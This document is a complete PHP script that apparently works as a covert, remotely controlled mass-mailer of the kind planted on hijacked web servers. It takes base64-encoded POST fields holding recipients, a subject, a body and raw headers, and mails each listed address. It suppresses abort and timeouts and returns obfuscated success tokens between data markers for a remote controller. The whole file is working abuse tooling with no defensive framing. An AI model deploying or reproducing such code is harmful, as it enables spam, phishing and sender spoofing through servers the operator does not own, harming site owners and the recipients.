<?php 

set_time_limit ( 666000 );
@ignore_user_abort (true);

function generateMessageID()
{
  return sprintf(
    "<%s.%s@%s>",
    base_convert(microtime(), 10, 36),
    base_convert(bin2hex(openssl_random_pseudo_bytes(8)), 16, 36),
    $_SERVER['SERVER_NAME']
  );
}

  


function generateRandomString($length = 10) {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}





echo '##START_DATA##';
$i = 0;
foreach($_POST as $key => $x_value) {

$data = base64_decode($x_value) ;

$to_data = explode('|',  $data);


$to_mails = explode('/',  $to_data[0]);

foreach($to_mails as $value){


$x_body = $to_data[2];
$headers = $to_data[3];
$x_subject = $to_data[1];



$jfnbrsjfq = mail($value,  $x_subject, $x_body,  $headers);
if($jfnbrsjfq){echo 'vwkxlpc';} else {echo 'yfbhn : ' . $jfnbrsjfq;} 

$i++;
}

echo '##END_DATA##';
exit;




}
